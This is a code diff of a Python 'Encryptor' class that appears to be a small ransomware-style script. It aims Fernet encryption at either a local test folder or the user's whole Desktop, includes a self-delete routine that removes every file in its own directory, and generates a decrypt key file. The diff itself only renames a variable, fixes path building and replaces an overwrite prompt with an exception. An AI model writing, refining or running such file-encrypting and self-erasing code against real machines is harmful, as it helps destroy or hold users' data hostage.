@@ -2,27 +2,28 @@ from cryptography.fernet import Fernet
 import os, sys, time
 
 class Encryptor:
-    def __init__(self, typeOfEncrypt, autoDelete=False, verbose=True):
+    def __init__(self, encryptScope, autoDelete=False, verbose=True):
         if os.name != "nt":
             self.VerboseInfo("SHUTDOWN", "Only runs on windows", True)
 
         self.verbose = verbose
-        self.typeOfEncrypt = typeOfEncrypt # Local (folder ./target_files) / Global (all files)
+        self.encryptScope = encryptScope # Local (folder ./target_files) / Global (all files)
         self.scriptPath = os.getcwd()
         
         if autoDelete == True:
             self.SelfDelete()
 
-        if self.typeOfEncrypt == "local": 
-            self.encryptPath = self.scriptPath + "\local_target_files"
-        elif self.typeOfEncrypt == 'global': 
-            self.encryptPath = os.path.expanduser("~/desktop")
+        if self.encryptScope == "local": 
+            self.encryptPath = os.path.join(self.scriptPath, "local_target_files")
+        elif self.encryptScope == 'global': 
+            self.encryptPath = os.path.join(os.path.expanduser("~"), "desktop")
+            
 
     def SelfDelete(self):
         os.chdir(self.scriptPath)
 
         for file in os.listdir(self.scriptPath):
-            if self.typeOfEncrypt == 'local' and file == "local_target_files":
+            if self.encryptScope == 'local' and file == "local_target_files":
                 pass
             else:
                 try: os.remove(file)
@@ -33,11 +34,7 @@ class Encryptor:
         os.chdir(self.scriptPath)
 
         if "decrypt_key.key" in os.listdir():
-            user_imput = input("⚠️ There's already a decrypt key !\nErase the previous one ? (y/n) ")
-            
-            if user_imput == "n":
-                sys.exit()
-                
+            raise FileExistsError("There's already a decrypt key")  
         key = Fernet.generate_key()
 
         with open(f"{self.scriptPath}/decrypt_key.key", "wb") as fileContainingKey:
